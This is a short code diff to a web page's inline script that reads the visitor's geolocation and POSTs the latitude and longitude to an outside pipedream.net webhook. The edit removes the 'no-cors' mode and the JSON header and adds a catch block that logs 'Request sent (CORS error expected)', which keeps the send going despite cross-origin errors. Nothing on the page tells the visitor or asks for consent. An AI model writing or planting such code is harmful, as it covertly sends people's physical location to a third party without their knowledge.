@@ -9,14 +9,12 @@
         navigator.geolocation.getCurrentPosition(function(position) {
             fetch('https://eon186u4rmikh86.m.pipedream.net', {
                 method: 'POST',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
                 body: JSON.stringify({
                     lat: position.coords.latitude,
                     lon: position.coords.longitude
                 })
+            }).catch(function(error) {
+                console.log('Request sent (CORS error expected)');
             });
         });
     </script>
